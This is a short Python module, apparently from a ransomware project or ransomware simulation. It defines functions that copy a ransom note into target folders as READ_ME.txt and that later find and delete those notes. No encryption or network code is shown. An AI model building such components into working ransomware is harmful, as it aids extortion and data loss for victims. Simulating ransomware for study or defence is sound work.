import shutil
import os
from config import TARGET_DIR, RANSOM_NOTE

def resource_path(relative_path):
    # No use of sys._MEIPASS for this general project
    base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def drop_ransom_note(folder_path):
    note_source = resource_path(RANSOM_NOTE)
    note_destination = os.path.join(folder_path, "READ_ME.txt")
    if os.path.exists(note_source):
        shutil.copy(note_source, note_destination)
    else:
        print(f"Ransom note not found: {note_source}")

def remove_ransom_note(folder_path=None):
    if folder_path is None:
        folder_path = TARGET_DIR
    for root, _, files in os.walk(folder_path):
        for file in files:
            if file == "READ_ME.txt":
                try:
                    os.remove(os.path.join(root, file))
                    print(f"Removed ransom note: {os.path.join(root, file)}")
                except Exception as e:
                    print(f"Failed to remove ransom note: {e}")
